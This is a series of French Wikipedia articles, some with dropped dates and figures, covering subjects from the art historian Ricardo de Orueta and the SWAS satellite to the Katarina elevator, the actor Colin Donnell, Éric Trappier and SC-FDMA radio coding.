À partir de 1911, il fut très proche de l'Institution libre d'enseignement ainsi que la Résidence d'étudiants de Madrid. Il connut directement les plus grands intellectuels des générations de 98 et 27 ; il fut particulièrement proche de José Ortega y Gasset, Juan Ramón Jiménez (qui lui adressa un texte dans '), Manuel Azaña, Alberto Jiménez Fraud et José Moreno Villa ('), et de manière générale de toutes les personnes impliquées dans l'élévation du niveau culturel espagnol lors de l'.
Ricardo de Orueta fut un investigateur important sur la sculpture dans la section « Sections d'Archéologie et d'Art » du Centre d'études historiques.
Il écrivit au début du plusieurs monographies importantes sur des sculpteurs espagnols comme Pedro de Mena (1914), Gregorio Fernández (mais dont le livre s'appela "Gregorio Hernández", 1920), et surtout sur Alonso Berruguete (dans "", 1917), qui contenait ses propres photos, ce qui fut une action pionnière dans la critique de l'art en Espagne. Ce livre le consacra comme l'un des critiques d'art espagnols les plus importants de son temps.
Il étudia la sculpture funéraire dans diverses régions de la péninsule ibérique et son texte "L'expression de la douleur dans la sculpture espagnole" fut son révélateur discours de réception à l'Académie royale espagnole à Madrid en 1924.
Il se consacra ensuite à étudier l'art chrétien en Espagne, mais cette étude fut interrompue par ses obligations comme homme politique. Le manuscrit est exposé lors de l'exposition « Ricardo de Orueta (1868-1939), en el frente del arte », en 2014.
Organisateur de l'art.
Sa vie comme propulseur de la protection des arts en Espagne fut décisive et son apogée eut lieu lors de la seconde République espagnole, à un âge déjà avancé. Il appartint au Parti réformiste et fut très lié à Manuel Azaña, ce qui le conduisit à prendre des responsabilités publiques au sein d'Action Républicaine, qu'il assume avec brio.
Dans les années 1930, il fut élevé au poste de Directeur général des Beaux Arts à deux occasions différentes, toutes deux ayant leur importance. Il chercha toujours à sauvegarder le patrimoine artistique espagnol (qui s'appelait alors "", « Trésor artistique national »), qui souffrait alors d'une importante saignée lors de la décennie antérieure. Orueta obtint ce poste pour la première fois avec l'apparition de la république, en et le conserva jusqu'en décembre de 1933. Il accéda de nouveau à ce poste en , mais dû le laisser quand le Parti Communiste Espagnol se chargea du portefeuille ministériel correspondant.
Lors de cette première étape, Orueta impulsa d'importantes mesures législatives pour la préservation et le développement des compétences des Beaux Arts. C'est ainsi qu'il créa la en 1933 et fondation de nouveaux musées (en les transformant ainsi que le mécénat), en particulier le Musée national de la sculpture (qui fut appelé de 2008 à fin 2011 Collège San Gregorio) de Valladolid et celui d'Aranjuez, l’' de Barcelone, le ' de Soria, le ' de Santander, l’' de Madrid ou l’"" d'Almería.
Par ailleurs, Orueta nomma et confirma de grandes figures, telles que , à la sous-direction du Musée du Prado ; José Moreno Villa à la direction des Archives du Palais ; ou encore à à la tête du Musée d'art moderne. Il créa des structures d'investigation historico-artistiques, à vocation protectionnistes et divulgatrices comme le "Fichier d'art antique" (1931).
Lors de sa deuxième étape comme directeur général, il récupéra dans un premier temps sa ligne de direction antérieure, puis dut se mettre au service de la défense du patrimoine lors de la Guerre civile espagnole, et en tant que grand connaisseur des Beaux-Arts, il réalisa une sauvegarde exemplaire. Il mourut peu après, des suites d'une chute dans le Caserón del Buen Retiro, alors le siège du musée des reproductions.
Récupérations.
Juan Ramón Jiménez évoque en 1942 sa grande courtoisie, ses yeux entrouverts , tandis que José Moreno Villa le mentionne souvent dans ses mémoires, "Vida en claro", en faisant remarquer qu'il était devenu un homme éminent dans la sculpture, comme Américo Castro en philologie ou García Morente en philosophie.
L'Université de Malaga récupère en 1989 un fac-similé de sa monographie sur "Pedro de Mena".
C'est au qu'est réalisé le plus grand nombre de rééditions, grâce au Musée national de sculpture, où ont été publiées "Berruguete y su obra" (2011) et "Gregorio Fernández", ainsi que "La expresión de dolor en la escultura castellana" (2013), avec des photos de ses fonds documentaires, parfois de son propre fait, ainsi que "La escultura española de los siglos XI y XII" en 2015 (inédit à sa mort).
Le , Acción Cultural Española, promue par le Musée national de Sculpture, inaugure l'exposition « Esto me trae aquí. Ricardo de Orueta (1868-1939), en el frente del arte ». Elle permet la révision générale de sa figure de visionnaire, de son travail et de ses œuvres, et analyse la récupération du trésor artistique espagnol, la met en relation avec l'. Elle s'expose à nouveau à partir du à Malaga, puis à la Résidence d'étudiants de Madrid de mars à .
En , le musée national de la sculpture promeut une partie de l'exposition sur Ricardo de Orueta, qui est présentée dans plusieurs centres éducatifs, dont l'université de Salamanque et l'université complutense de Madrid et différents collèges tout au long de l'année 2016.

</doc>
<doc id="6806912" url="https://fr.wikipedia.org/wiki?curid=6806912" title="Submillimeter Wave Astronomy Satellite">
Submillimeter Wave Astronomy Satellite

Submillimeter Wave Astronomy Satellite ou SWAS ou Explorer 74 est un petit satellite scientifique du programme Small Explorer de la NASA lancé en 1998. La charge utile est constituée par un télescope spatial observant le spectre des micro-ondes (510-640 μm). L'objectif de la mission est d'analyser la composition des nuages interstellaires et de déterminer comment ces nuages se refroidissent lorsqu'ils s'effondrent pour former les étoiles et les planètes.
Objectifs.
Le satellite a pour objectif de dresser une carte détaillée des cœurs d'au moins 20 nuages moléculaires géants et nuages sombres avec une résolution de 1 × 1 degré en identifiant les raies des molécules suivantes : vapeur d'eau, oxygène moléculaire, carbone neutre, isotope 13 du monoxyde de carbone, isotope 18 de l'eau.
Caractéristiques techniques.
SWAS est un satellite stabilisé sur trois axes pointé vers la portion du ciel observé avec une précision de 38 secondes d'arc. Le contrôle d'attitude est assuré à l'aide de trois magnéto-coupleurs, quatre roues de réaction, un magnétomètres, trois gyroscopes et un viseur d'étoiles. Le satellite a une masse totale de dont 102 sont constitués par l'unique instrument embarqué. SWAS comporte 4 panneaux solaires déployables non orientables et un panneau fixé sur le corps central, avec une surface totale de . Les cellules solaires fournissent en moyenne. La consommation moyenne du bus est de tandis que le télescope utilise .
Le télescope millimétrique.
L'instrument comporte un télescope de type Cassegrain décentré de forme elliptique (55 × ). Les détecteurs sont constitués par une paire de radiomètres micro-ondes utilisés utilisent une paire de diodes Schottky refroidis de manière passive à 170 K. Les signaux produits par les deux radiomètres sont combinés pour former un signal de fréquence intermédiaire qui s'étend sur la bande des . Un spectromètre optico-acoustique (AOS) fourni par l'université de Cologne décompose ce signal en 1 400 canaux de enregistrés par un capteur CCD de 1400 pixels. Une image est prise toutes les 2 secondes.
Déroulement de la mission.
Le satellite est lancé le par un lanceur Pegasus XL et placé sur une orbite circulaire de à forte inclinaison (69,9°). Le télescope observe en moyenne 3 à 5 cibles à chaque orbite. Le choix de son orientation est contrainte par la nécessité de placer les panneaux solaires face au Soleil avec une tolérance de 15°. Les données collectées sont transmises à un centre d'opérations destiné à la mission et situé à Cambridge dans le Massachusetts.
SWAS est placé en hibernation le après avoir collecté des données durant 5,5 ans. Le , SWAS est réactivé dans le cadre de la mission Deep Impact pour que le télescope puisse observer le résultat de la collision volontaire de l'impacteur de Deep Impact avec la comète Tempel 1 qui a lieu le . SWAS présente l'avantage sur les autres instruments qui doivent observer cet événement d'être situé au-dessus de l'atmosphère et de disposer d'un instrument adapté à la détection des molécules d'eau ; avant la collision, le télescope parvient à mesurer que la comète éjecte d'eau par seconde, ce qui est un débit relativement peu élevé pour une comète dans cette phase de son orbite. Le résultat des mesures contredit les modèles en vigueur car contrairement aux attentes les volumes d'eau éjectés ne sont pratiquement pas modifiés à la suite de la collision. Les données fournies par SWAS sont corroborées par d'autres instruments. Le , il est remis en hibernation.

</doc>
<doc id="6806914" url="https://fr.wikipedia.org/wiki?curid=6806914" title="Chitulia mamillaris">
Chitulia mamillaris



</doc>
<doc id="6806916" url="https://fr.wikipedia.org/wiki?curid=6806916" title="SWAS">
SWAS



</doc>
<doc id="6806917" url="https://fr.wikipedia.org/wiki?curid=6806917" title="Explorer 74">
Explorer 74



</doc>
<doc id="6806921" url="https://fr.wikipedia.org/wiki?curid=6806921" title="Chitulia ornata">
Chitulia ornata



</doc>
<doc id="6806926" url="https://fr.wikipedia.org/wiki?curid=6806926" title="Hydrophis ornata ornata">
Hydrophis ornata ornata



</doc>
<doc id="6806927" url="https://fr.wikipedia.org/wiki?curid=6806927" title="Hydrophis ornata ocellata">
Hydrophis ornata ocellata



</doc>
<doc id="6806929" url="https://fr.wikipedia.org/wiki?curid=6806929" title="Hydrophis ornata godeffroyi">
Hydrophis ornata godeffroyi



</doc>
<doc id="6806932" url="https://fr.wikipedia.org/wiki?curid=6806932" title="Chitulia sibauensis">
Chitulia sibauensis



</doc>
<doc id="6806936" url="https://fr.wikipedia.org/wiki?curid=6806936" title="Chitulia stricticollis">
Chitulia stricticollis



</doc>
<doc id="6806938" url="https://fr.wikipedia.org/wiki?curid=6806938" title="Impératrice du Mexique">
Impératrice du Mexique



</doc>
<doc id="6806943" url="https://fr.wikipedia.org/wiki?curid=6806943" title="Chitulia torquata">
Chitulia torquata



</doc>
<doc id="6806944" url="https://fr.wikipedia.org/wiki?curid=6806944" title="Alam Ara">
Alam Ara

Alam Ara (hindi : आलम आरा, ourdou : عالم آرا) est un film dramatique indien de Bollywood, réalisé par Ardeshir Irani, sorti le en Inde. Il s'agit du premier film sonorisé indien.
Le film est considéré comme perdu.

</doc>
<doc id="6806949" url="https://fr.wikipedia.org/wiki?curid=6806949" title="Gréage">
Gréage



</doc>
<doc id="6806953" url="https://fr.wikipedia.org/wiki?curid=6806953" title="Hydrophis torquata torquata">
Hydrophis torquata torquata



</doc>
<doc id="6806954" url="https://fr.wikipedia.org/wiki?curid=6806954" title="Hydrophis torquata diadema">
Hydrophis torquata diadema



</doc>
<doc id="6806955" url="https://fr.wikipedia.org/wiki?curid=6806955" title="Hydrophis torquata aagaardi">
Hydrophis torquata aagaardi



</doc>
<doc id="6806960" url="https://fr.wikipedia.org/wiki?curid=6806960" title="Silazane">
Silazane

Un silazane est un composé chimique . Il s'agit d'un analogue des siloxanes dans lesquels le pont est remplacé par un pont ce pourquoi L'IUPAC les définit comme des «  "Saturated silicon-nitrogen hydrides, having straight or branched chains. They are analogous in structure to siloxanes with –NH– replacing –O– ," [...] "By extension hydrocarbyl derivatives are commonly included". » Ils peuvent présenter une chaîne d'atomes linéaire ou ramifiée. Le trisilazane, soit , soit ou soit , etc., en est un exemple. Ainsi n'est pas à proprement parler un silazane.

</doc>
<doc id="6806961" url="https://fr.wikipedia.org/wiki?curid=6806961" title="Ascenseur Katarina">
Ascenseur Katarina

Lascenseur Katarina ("Katarinahissen" en suédois) est un ascenseur public situé à Slussen dans le quartier de Södermalm au centre de Stockholm en Suède. Il permet aux piétons de se rendre de la rue Katarinavägen, près des rives de la mer Baltique, à la place Mosebacke Torg, sur les hauteurs du quartier de Södermalm.
Un premier ascenseur, construit sur les lieux en 1881, a été démoli en 1933. L'actuel édifice a été inauguré en 1936. Depuis 2010, il est fermé au public, la structure étant jugée fragilisée par sa vétusté.
Le premier ascenseur.
En 1881, l'ingénieur obtient l'autorisation du conseil municipal pour la construction d'un ascenseur et d'un pont piétonnier reliant les quais de la mer Baltique à la place Mosebacke Torg. L'objectif est de faciliter l'accès à ce lieu particulièrement escarpé de Stockholm. 
L'inauguration a lieu à 11 h 00 le . Au cours du premier mois, environ empruntent l'ascenseur de façon quotidienne. Le prix est alors de () pour monter et de pour descendre. 
La tour et le pont piéton sont construits par la société belge Lecoq &amp; Comp, tandis que l'ascenseur lui-même est une réalisation de la firme américaine Weeks &amp; Halsey. Au tout début, l'ascenseur est entraîné par une machine à vapeur, remplacée par un moteur électrique en 1915.
Dès les années 1890, le haut de la tour de l'ascenseur, visible depuis une grande partie de la vieille ville de Stockholm, est utilisé comme support à diverses enseignes publicitaires. En particulier, en 1909, une réclame pour le dentifrice Stomatol y est installée. C'est alors la première enseigne lumineuse animée de Suède. En 1933, elle est déplacée vers un bâtiment proche.
Le nouvel ascenseur.
Le premier ascenseur est fermé le . Il est démoli début du mois de juin de la même année, lors de la construction de l'échangeur de Slussen.
Un nouvel ascenseur est inauguré en 1936. Il est directement relié à l'un des bâtiments du complexe immobilier , construit au même moment pour servir de siège à la coopérative . La structure en acier a été dessinée par les architectes et du cabinet (Kooperativa förbundets arkitektkontor), filiale de la coopérative.
L'ascenseur, qui dispose de deux cabines, est à l'origine contrôlé manuellement. Même après avoir été automatisé, on y trouve toujours des employés, à l'intérieur des cabines et pour la vente des billets.
En 1999, à l'occasion du centenaire de la coopérative KF, la poste suédoise édite un timbre à l'effigie de l'ascenseur Katarina. Pendant de nombreuses décennies, le logo de la coopérative figure au sommet de l'édifice. Il est remplacé en 2001 par le logo de l'une de ses filiales, les supermarchés .
En 2009, le prix public du trajet, montée ou descente, était de .
Fermeture de l'ascenseur.
En 2011, le propriétaire-gérant de l'ascenseur, la société , annonce que l'édifice, fermé depuis déjà un an, ne sera pas rouvert dans l'immédiat, la structure de l'installation étant dans un état d'usure avancé. Les travaux de rénovation prévus s'inscrivant dans le cadre d'une très importante opération de réaménagement urbain affectant tout le quartier de Slussen, l'ascenseur ne pourra pas être remis en service avant 2019.

</doc>
<doc id="6806963" url="https://fr.wikipedia.org/wiki?curid=6806963" title="Leucobryaceae">
Leucobryaceae

La famille des Leucobryaceae regroupe plusieurs genres de bryophytes, dont:
Quatre genres se rencontrent en Europe: "Atractylocarpus" (ce genre est fort rare dans les Alpes), "Campylopus", "Dicranodontium" et "Leucobryum" (seul genre en Russie).

</doc>
<doc id="6806964" url="https://fr.wikipedia.org/wiki?curid=6806964" title="Katarinahissen">
Katarinahissen



</doc>
<doc id="6806971" url="https://fr.wikipedia.org/wiki?curid=6806971" title="Sylvie Fréchette (alpiniste)">
Sylvie Fréchette (alpiniste)

Sylvie Fréchette, née le à Val-d'Or, en Abitibi-Témiscamingue, est une alpiniste et conférencière canadienne. Elle est également femme d'affaires, "coach" de vie et écrivaine.
Biographie.
Sylvie Fréchette est née le à Val-d'Or, en Abitibi-Témiscamingue.
Le , elle devient la Canadienne à atteindre le sommet de l’Everest et la deuxième Québécoise. Elle est la première canadienne chef d’expédition sur l’Everest et à en avoir réussi l'ascension.
Ascensions notables.
Sylvie Fréchette a gravi des sommets en Amérique du Sud et en Asie.

</doc>
<doc id="6806972" url="https://fr.wikipedia.org/wiki?curid=6806972" title="Georg Ernst Ludwig Hampe">
Georg Ernst Ludwig Hampe



</doc>
<doc id="6806981" url="https://fr.wikipedia.org/wiki?curid=6806981" title="Dream of the Elders">
Dream of the Elders

 est un album du Dave Holland Quartet.
Description.
Composé uniquement de compositions de Dave Holland, cet album est une illustration post-bop d’un quartet basse-saxophone-vibraphone-batterie. Le quartet est rejoint par la chanteuse Cassandra Wilson pour un titre.
Titres.
Tous les titres sont composés par Dave Holland

</doc>
<doc id="6806985" url="https://fr.wikipedia.org/wiki?curid=6806985" title="Colin Donnell">
Colin Donnell

Colin Donnell, né le à Saint-Louis, dans le Missouri, est un acteur et chanteur américain.
Sa carrière artistique débute en alternant théâtre et comédies musicales. Après avoir joué dans la série fantastique "Arrow" et Scotty Lockhart dans la série dramatique "The Affair", il se fait connaître du grand public en interprétant le docteur Connor Rhodes dans la série médicale "Chicago Med" et ses séries dérivées.
Biographie.
Jeunesse et formation.
Colin Donnell est né le à Saint-Louis dans le Missouri. Il est le plus jeune de ses trois frères. Il a joué de la guitare et a pris des leçons de chants lorsqu'il avait 17 ans.
Son initiation à la scène a été au lycée où il faisait partie de la chorale et jonglait dans le fond et faisait des tours de cirque. Colin est diplômé de l'Université de l'Indiana.
Carrière.
De Broadway à la télévision.
Donnell a fait partie de plusieurs tournées nationales tel que "Mamma Mia !" et "Wicked". Sa première représentation à Broadway était dans la comédie musicale "Jersey Boys" dans le rôle de Hank Mejewski. Les autres pièces ou comédies musicales où il est crédité sont "Follies", "Le Chant du Missouri", "Anything Goes" comédie musicale pour laquelle il a été nommé pour un Drama Desk Award, "" et d'autres.
Donnell a débuté à la télévision en jouant le rôle de Mike Ruskin dans quelques épisodes de l'éphémère série télévisée "Pan Am".
En 2012, il interprète le rôle de Tommy Merlyn dans la série télévisée "". Son personnage fait partie de la distribution principale lors de la première saison puis devient un invité régulier par la suite.
En 2014, il joue dans son premier long métrage pour le film dramatique "Every Secret Thing", mené par une distribution principale d'actrices telles que Diane Lane, Elizabeth Banks et Dakota Fanning. La même année, il s'invite le temps d'un épisode, dans des séries telles que "Person of Interest", "Unforgettable" et "Les Mystères de Laura".
Rôles réguliers.
Entre 2014 et 2015, il joue un rôle récurrent dans les deux premières saisons de la série dramatique, saluée par les critiques, "The Affair".
En 2015, il décroche le rôle de Sean, l'un des personnages principaux d'une série dramatique développée par NBC, "Love Is A Four Letter Word", mais le projet ne dépasse finalement pas le stade de pilote.
Cependant, à partir de , il est à l'affiche de la nouvelle série de Dick Wolf, pour le même réseau, "Chicago Med". Il s'agit d'une série dérivée de "Chicago Fire" et "Chicago Police Department". Il y interprète le rôle du Connor Rhodes, un médecin du "Chicago Medical Center".
Alors qu'il envisageait de faire une pause avec "Chicago Med" pour avoir la possibilité de revenir dans la série "" bien vivant ou en intégrant la série "Legends of Tomorrow" (cette dernière étant basée sur le voyage dans le temps), il finit par réapparaître dans une version alternative de son personnage.
En 2017, le show médical "Chicago Med" est renouvelé pour une troisième saison grâce à la stabilité de ses audiences.
En 2019, alors que "Chicago Med" est renouvelée pour une nouvelle saison, l'acteur est libéré de son contrat, à l'issue de la saison 4, à la suite de décisions créatives relatives à l'évolution des personnages. Néanmoins, l'acteur est potentiellement amené à reprendre son rôle lors d'éventuelles apparitions en tant que guest-star. Parallèlement, il conserve son engagement dans la série "Arrow", en tant qu'invité régulier.
Le , on apprend qu'il remplacera Luke Kleintank dans "", il apparaitra dans les deux derniers épisodes de la saison 3, puis deviendra principal à partir de la quatrième saison.
Vie privée.
Il est marié à , actrice de théâtre et cheerleader. Elle a d’ailleurs décroché un rôle récurrent dans la deuxième saison de "Chicago Med" aux côtés de son mari Colin. Elle incarne le personnage de la pathologiste Nina Shore.
Le , le couple annonce attendre leur premier enfant, une fille, pour juillet. Le 14 juillet, ils deviennent parents d'une petite Cécily.
Vie privée.
Donnell a commencé à fréquenter l'actrice Patti Murin en 2013 suite à leur collaboration dans l'adaptation musical de Peines d'amour perdues dans le cadre du projet Shakespeare in the park. Il se sont fiancés en 2014, puis mariés le 19 juin 2015 à New York.
Leur premier enfant, Cecily, est née le 14 juillet 2020. En octobre 2022, le couple a annoncé que Murin était enceinte de leur deuxième enfant. Lorelai est née le 2 avril 2023.
Donnell est un passionné de littérature, est plus d'être musicien.
Il s'est fait tatouer deux fois pendant ses tournées – une à Memphis et une autre à Dayton. Le premier tatou représente cinq silhouettes d'oiseaux pour symboliser sa famille et le deuxième est une fleur de lys puisque sa mère est française.
Filmographie.
Télévision.
"Un amour polaire (Love on Iceland)" : 
Charlie.
Son épouse Patti Murin joue également à ses côtés le rôle d'Isabella. 

</doc>
<doc id="6806987" url="https://fr.wikipedia.org/wiki?curid=6806987" title="Leucobryum">
Leucobryum

Le genre de mousses végétales Leucobryum appartient à la famille des "Dicranaceae". Il comprend 83 espèces, dont deux se rencontrent en Europe: "Leucobryum glaucum" et "Leucobryum juniperoideum". Les autres espèces se rencontrent surtout dans les Tropiques.
Liste d'espèces.
Selon :
Selon :
Selon :
Selon :
Selon :
Selon (Attention liste brute contenant possiblement des synonymes) :

</doc>
<doc id="6806992" url="https://fr.wikipedia.org/wiki?curid=6806992" title="Abbé Guérin">
Abbé Guérin



</doc>
<doc id="6806995" url="https://fr.wikipedia.org/wiki?curid=6806995" title="Handball en Belgique">
Handball en Belgique

Le handball est un sport mineur en Belgique. Les compétitions de handball sont organisées par différents organismes. La Division 1 et 2 sont ainsi organisées par l'URBH. Les divisions régionales sont organisés par la Ligue francophone de handball et la Vlaamse Handbal Vereniging pour les clubs qui leur sont affiliés. Les compétitions provinciales sont organisés par les comités provinciaux. 
La BeNe League est cogéré par l'Union royale belge de handball et par la Nederlands Handbal Verbond.
Histoire.
Le handball a été importé par le liégeois Jules Devlieger après l'avoir découvert aux Olympiades ouvrières de Prague en 1921. Il l'introduit en Province de Liège où il connait un grand succès, l'Union Beynoise, le matricule 3, fondé en 1921 est aujourd'hui le plus vieux club du royaume.
En 1949, au retour d'un tournoi en Scandinavie, Jules Devlieger, accompagné de Roger Crutzen introduisit le handball à sept en Belgique, 
En 1956, l'Union belge de handball est créée et organisa ses propres compétitions à sept. La première compétition officielle voit le jour à l'issue de la saison 1958-1959. Les premières années voient les clubs liégeois dominer outrageusement les compétitions nationales à l'instar du ROC Flémalle vainqueur de 11 titres de champion et de 3 Coupe de Belgique. 
Structure de la compétition féminine.
URBH.
Depuis la régionalisation de la Belgique en 1977, l'Union Royal Belge de Handball (URBH) organise tous les ans la première division et la deuxième division national masculine et féminine. Il y a quelques années, l'URBH organisait la division d'honneur qui a été remplacé par la première division national.
Médias.
Le handball est un des sports collectifs les moins populaires en Belgique et n'est donc pas très médiatisé sur les chaînes nationales, il est cependant plus médiatisé sur les chaînes locales telles que 

</doc>
<doc id="6807002" url="https://fr.wikipedia.org/wiki?curid=6807002" title="Mashed potato">
Mashed potato

Le mashed potato, selon l'anglais signifiant « purée de pommes de terre », est une danse populaire au début des années 1960, durant la période du twist et de la musique rock 'n' roll. 
En France, on l'appelait de préférence mashed potatoes.
Danse et succès musicaux.
Introduit en 1962, le mashed potato fait partie de la série de danses populaires qui ont accompagné le succès mondial de la musique rock 'n' roll et qui se sont placées dans le sillage du twist afin de tenter d'en répliquer le succès. La chanson américaine "" (1962) de Dee Dee Sharp est l'une des premières à y faire référence ; par Nat Kendrick and the Swans et par James Brown. Le mashed potato est également évoqué dans le succès "Vacation" de Connie Francis, la même année, puis dans "Do You Love Me" par The Contours, "Dancin' Party" par Chubby Checker, "Let's Dance" par Chris Montez, "Harry the Hairy Ape" par Ray Stevens ou encore "Land of a Thousand Dances" de Chris Kenner.
En France, le mashed potato est lancé par Johnny Hallyday sur la scène de l'Olympia à l'automne 1962, précédé par un super 45 tours, avec au verso de la pochette Lee Hallyday détaillant en photographies comment le danser sur la chanson interprétée par Johnny "C'est le mashed potatoes" (adaptation du titre "Little Bitty Pretty One" de Bobby Day). Les chanteurs et groupes yéyés exploitent un temps cette danse en 1962-1963, avant qu'elle ne tombe très vite dans l'oubli.
Chorégraphie.
La chorégraphie commence par un pas en arrière d'une jambe, avec le talon tourné vers l'intérieur. L'autre pied est alors légèrement positionné en arrière par rapport à l'autre, lors de la première pause. On s'appuie ensuite sur la plante du pied de départ, talon tourné alors vers l'extérieur. Il convient de répéter ces pas en changeant de pied et ainsi de suite.

</doc>
<doc id="6807010" url="https://fr.wikipedia.org/wiki?curid=6807010" title="Léon Charpentier (homme politique)">
Léon Charpentier (homme politique)

Léon Charpentier, né le à Haraucourt (Ardennes) et mort le à Sedan (Ardennes), est un homme politique français.

</doc>
<doc id="6807011" url="https://fr.wikipedia.org/wiki?curid=6807011" title="Bénigne Fournier">
Bénigne Fournier

Bénigne Fournier, né le à Sombernon (Côte d'Or) et mort le dans la même localité, est un homme politique français.
Biographie.
Né en 1897 d'une famille de cultivateurs, Bénigne Fournier poursuit à l'école Saint-Joseph de Dijon ses études commencées à l'école communale de Sombemon, lorsque éclate la première guerre mondiale.
Il est conseiller général du canton de Sombernon de 1945 à 1957 et sénateur de la Côte-d'Or de 1948 à 1957.

</doc>
<doc id="6807012" url="https://fr.wikipedia.org/wiki?curid=6807012" title="Henri Guénin">
Henri Guénin

Henri Guenin, né le à Bussy-le-Grand et mort le à Semur-en-Auxois, est un homme politique français.

</doc>
<doc id="6807021" url="https://fr.wikipedia.org/wiki?curid=6807021" title="Thermoset">
Thermoset



</doc>
<doc id="6807022" url="https://fr.wikipedia.org/wiki?curid=6807022" title="Éric Trappier">
Éric Trappier

Éric Trappier est un dirigeant d'entreprise français, né le . En 2013, il est devenu le président-directeur général (PDG) de Dassault Aviation depuis sa création en 1929 et aussi le plus jeune à prendre ce poste ().
En janvier 2025, Éric Trappier devient président du groupe industriel Marcel Dassault (GIMD), tout en restant PDG de Dassault Aviation.
Biographie.
Éric Trappier est un ingénieur diplômé de Télécom SudParis. Il a servi comme officier dans la Marine nationale durant son service militaire en 1983 et 1984. Il entre ensuite dans le groupe Dassault Aviation à l'âge de .
Le , Éric Trappier est coopté comme administrateur de Dassault Aviation, en remplacement de Philippe Hustache, pour la durée restant à courir du mandat de ce dernier, soit jusqu’à l’issue de l’assemblée générale qui statuera sur les comptes de l’exercice 2014. Quelques jours après, le , le conseil d’administration le nomme président-directeur général.
En , Éric Trappier est élu président de l'Association européenne des industries aérospatiale et défense (ASD).
Le , Éric Trappier est élu président du Groupement des industries françaises aéronautiques et spatiales (GIFAS), dont il était précédemment premier vice-président.
Il est président du Conseil des Industries de Défense Françaises (CIDEF), une association qui réunit les groupements professionnels de l’industrie française de défense, entre mars 2021 et janvier 2023. 
Éric Trappier est également élu président de l’Union des industries et métiers de la métallurgie (UIMM) le 15 avril 2021.
Il épouse, en 1983, Isabelle Harnisch avec qui il a trois enfants.
Carrière chez Dassault Aviation.
De 1984 à 1987, il prend la direction générale technique du bureau d'études et de la direction des systèmes d'armes puis de 1987 à 1991, la direction technique internationale chargée des négociations avec la Corée, Singapour, l'Arabie Saoudite, le Chili, l'Allemagne et participe à la vente de l'avion de patrouille maritime "Atlantique". De 1991 à 1995, c'est le tour de la direction générale internationale comme responsable des ventes avec l'Asie et du contrat "Mirage" avec l'Inde. De 1995 à 2000, il passe à la direction générale internationale comme responsable des ventes avec les Émirats arabes unis et gère le contrat "Mirage 2000-9" avec les Émirats. De 2000 à 2001, il prend la direction générale internationale comme directeur régions Moyen-Orient &amp; Afrique puis de 2001 à 2005, comme directeur des exportations militaires et enfin de 2002 à 200, les négociations et signatures des Accords nEUROn avec Saab/Suède, RUAG/Suisse, Alenia/Italie, HAI/Grèce, EADS/Espagne.
nEUROn.
Négociateur des accords industriels pour la fabrication du drone de combat, le nEUROn, il négocie le partenariat avec des industriels au niveau international et notamment avec les acteurs suédois (Saab), espagnol (EADS), italien (Alenia) suisse (RUAG) et grec (HAI). En 2006 ,il devient directeur général international et le , président-directeur général.
Présidence du GIMD.
Le , Éric Trappier succède à Charles Edelstenne à la tête du groupe industriel Marcel Dassault (GIMD), tout en restant PDG de Dassault Aviation.
Distinctions.
Le , Éric Trappier est nommé au grade d'officier dans l'ordre national du Mérite au titre de .
Le , il est nommé au grade de chevalier dans l'ordre national de la Légion d'honneur au titre de puis fait chevalier le . Il est promu au grade d'officier le au titre de et fait officier le . Le , il est promu au grade de commandeur au titre de .
Il est titulaire de la médaille de l'Aéronautique depuis 2023.
Notes et références.
Références.
 

</doc>
<doc id="6807024" url="https://fr.wikipedia.org/wiki?curid=6807024" title="Prime Directive (album)">
Prime Directive (album)

Prime Directive est un album du Dave Holland Quintet.
Description.
Prime Directive suit dans la même lignée que Points of View, le changement majeur étant le remplacement de Steve Wilson par Chris Potter. L'approche musicale est la même : ingénieuse, elle mélange changements rythmiques, contrepoint, improvisations simultanées, écriture précise, ostinatos à la basse, tout en acquérant un son distinctif. L’album témoigne une nouvelle fois de la qualité de Dave Holland en tant que leader, qui comme Ellington ou Mingus en leur temps, parvient à donner sa couleur à la musique tout en respectant la personnalité musicale de ses musiciens.
Titres.
Sauf indication, tous les titres sont composés par Dave Holland

</doc>
<doc id="6807027" url="https://fr.wikipedia.org/wiki?curid=6807027" title="SC-FDMA">
SC-FDMA

Le single-carrier FDMA (en anglais « "single-carrier frequency division multiple access" » ou SC-FDMA) est une technologie de codage radio numérique utilisée notamment dans les réseaux de téléphonie mobile de LTE ; elle utilise simultanément les techniques de multiplexages de type accès multiple par répartition en fréquence et celui par accès multiple à répartition dans le temps (multiplexage fréquentiel et temporel).
Le SC-FDMA a attiré l'attention comme une alternative séduisante à l'OFDM et à l'OFDMA, particulièrement dans les communications terre-satellite et dans le sens de transmission montant (terminal vers antenne-relais) des réseaux mobile 4G LTE et LTE-Advanced. 
Description technique.
Comme pour d'autres techniques à schéma d'accès multiples (TDMA, FDMA, CDMA, OFDMA), le but est l'attribution et le partage d'une ressource radio (bande de fréquence) entre plusieurs utilisateurs. Le SC-FDMA peut être considéré comme une variante linéaire des codages OFDM et OFDMA, dans le sens où il consiste aussi à répartir sur un grand nombre de sous-porteuses (plusieurs centaines) le signal numérique ; il impose aussi un écart de fréquence entre les sous-porteuses égal à la fréquence des symboles ce qui garantit l'orthogonalité des sous-porteuses et permet une plus grande efficacité spectrale, mais il utilise, en plus, une « DFT » (transformation de Fourier discrète) du signal pour précoder l'OFDMA conventionnel. 
Contrairement à l'OFDM utilisé dans les réseaux Wi-Fi, il intègre, comme l'OFDMA, une fonction de multiplexage temporel (avec une base de temps "TTI" de 1 ms dans les réseaux mobiles LTE) qui permet de partager la bande de fréquence radio entre un plus grand nombre d'utilisateurs et avec plus de souplesse, cela permet notamment une adaptation rapide aux variations de débits qui caractérisent les flux d'accès à Internet.
Le principal avantage du SC-FDMA tient à un facteur de crête et à un "PAPR" ("peak-to-average power ratio" en anglais) plus faibles que ceux du codage OFDMA ; cela améliore l’efficacité énergétique du terminal, en diminuant la puissance crête d’émission et donc le poids et le coût du terminal (smartphone ou tablette tactile) et en contribuant à l'augmentation de l'autonomie de la batterie. 
Ce PAPR plus faible, comparé à celui de l'OFDMA, provient de l'ajout d'une transformée de Fourier discrète ("DFT" en jaune dans le ) qui réalise, en émission, une conversion du domaine temporel dans le domaine fréquentiel, ce précodage « lisse » la puissance du signal émis, la rapproche de la valeur efficace (tension) du signal et diminue les variations d'amplitude à haute fréquence. La transformation inverse (iDFT) est faite en réception.
Utilisation.
Le SC-FDMA a été adopté pour les liaisons montantes (dans le sens terminal vers station de base) de certaines normes 3GPP, plus particulièrement pour la partie radio (eUTRAN) des réseaux mobiles « LTE », car ce codage permet de diminuer la consommation électrique du terminal et donc contribue à l'augmentation de l'autonomie de sa batterie.
